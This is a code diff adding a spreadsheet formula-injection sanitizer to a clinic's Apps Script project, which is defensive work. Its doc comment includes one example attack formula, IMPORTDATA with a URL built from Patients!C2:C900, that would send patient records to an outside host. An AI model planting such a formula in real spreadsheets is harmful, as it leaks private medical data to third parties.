@@ -913,6 +913,24 @@ function cresc_actorName_(fallback) {
   return fallback || 'SYSTEM';
 }
 
+/**
+ * TEXT THAT CAME FROM A PERSON, MADE SAFE TO WRITE INTO A CELL.
+ *
+ * appendRow() and setValue() read a string the way a keyboard entry is read:
+ * "=IMPORTDATA(\"https://…?\"&Patients!C2:C900)" typed into a name box is
+ * stored as a live FORMULA in the clinic's spreadsheet, running as the owner.
+ * The public data-request form takes text from anyone with the link, and the
+ * portal and the front desk take text from patients.
+ *
+ * A leading apostrophe tells Sheets to keep the entry as text; it is not
+ * stored, so the value reads back exactly as typed. Numbers, dates and
+ * booleans pass through untouched.
+ */
+function cresc_cellText_(v) {
+  if (typeof v !== 'string') return v;
+  return /^[=+@\t\r]/.test(v) || /^-[^\d.\s]/.test(v) ? "'" + v : v;
+}
+
 /** The signed-in person's display name, for a document someone reads. */
 function cresc_actorDisplay_(fallback) {
   var a = CRESC_CURRENT_ACTOR;
